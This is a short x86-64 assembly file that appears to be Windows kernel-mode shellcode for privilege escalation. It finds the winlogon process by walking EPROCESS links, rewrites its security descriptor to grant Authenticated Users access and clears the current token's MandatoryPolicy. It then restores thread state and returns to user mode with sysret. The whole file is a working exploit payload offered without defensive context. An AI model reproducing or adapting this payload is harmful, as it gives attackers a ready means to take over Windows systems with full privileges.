global _start

_start:
    mov rdx, [gs:0x188]                     ; $rdx = _KTHREAD
    mov rax, [rdx + 0xb8]                   ; $rax = _EPROCESS
    mov rbx, rax                            ; $rbx = _EPROCESS

    .loop:
        mov rbx, [rbx + 0x448]              ; $rbx = ActiveProcessLinks
        sub rbx, 0x448                      ; $rbx = _EPROCESS
        mov rcx, 0x6e6f676f6c6e6977         ; $rcx = "winlogon"
        cmp qword [rbx + 0x5a8], rcx        ; ImageFileName == "winlogon"
        jnz .loop                           ; if zf == 0 -> loop

    mov rcx, [rbx - 0x8]                    ; $rcx = SecurityDescriptor
    and cl, 0xf0                            ; Clear last byte
    mov byte [rcx + 0x48], 0xb              ; Authenticated Users

    mov rcx, [rax + 0x4b8]                  ; $rax = Process token
    and cl, 0xf0                            ; Clear last byte
    mov byte [rcx + 0xd4], 0x0              ; MandatoryPolicy

    mov cx, [rdx + 0x1e4]                   ; $cx = KernelApcDisable
    inc cx                                  ; fix value
    mov [rdx + 0x1e4], cx                   ; restore value

    mov rdx, [rdx + 0x90]                   ; $rdx = ETHREAD.TrapFrame
    mov rbp, [rdx + 0x158]                  ; $rbp = ETHREAD.TrapFrame.Rbp
    mov rcx, [rdx + 0x168]                  ; $rcx = ETHREAD.TrapFrame.Rip
    mov r11, [rdx + 0x178]                  ; $r11 = ETHREAD.TrapFrame.EFlags
    mov rsp, [rdx + 0x180]                  ; $rsp = ETHREAD.TrapFrame.Rsp

    xor eax, eax                            ; $eax = STATUS SUCCESS
    swapgs                                  ; swap gs segment
    o64 sysret                              ; return to usermodes